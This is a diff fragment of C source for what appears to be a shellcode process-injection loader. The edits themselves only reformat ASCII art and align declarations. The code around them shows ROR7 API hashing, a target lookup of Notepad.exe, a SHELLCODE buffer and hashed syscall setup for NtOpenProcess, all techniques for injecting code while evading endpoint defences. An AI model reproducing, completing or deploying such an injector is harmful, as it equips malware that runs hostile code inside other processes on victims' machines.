@@ -22,8 +22,8 @@
 //          .: . . . .;$:i;i;ii;:];:`
 //          p:.,.,.:;;$;!;\.!u;;:::`
 //          ?u;;;;iI$;;:;:;\.;i;"`
-//           `?~++~;i;!;:;:;"`
-//             `~-~:i;,:,:"`
+//           `?~ +~; ;!;:;:;"`
+//             `~ ~: ;,:,:"`
 //               `~;;;"`
 
 #define ROR7_32__NtQuerySystemInformation       0xEFFC1CF8
@@ -204,16 +204,16 @@ VOID main() {
 
         HANDLE PROCESS;
         HANDLE THREAD;
-        HANDLE PROC_ID = GET_PROC_ID(L"Notepad.exe");
-        PVOID INJECT = NULL;
-        ULONG_PTR SIZE = sizeof(SHELLCODE);
+        HANDLE PROC_ID          = GET_PROC_ID(L"Notepad.exe");
+        PVOID INJECT            = NULL;
+        ULONG_PTR SIZE          = sizeof(SHELLCODE);
 
         OBJECT_ATTRIBUTES ObjectAttributes = {
-                .Length = sizeof(OBJECT_ATTRIBUTES)
+                .Length         = sizeof(OBJECT_ATTRIBUTES)
         };
 
         CLIENT_ID ClientId = {
-                .UniqueProcess = PROC_ID
+                .UniqueProcess  = PROC_ID
         };
 
         SET_SYSCALL(NTDLL_API_.NtOpenProcess);
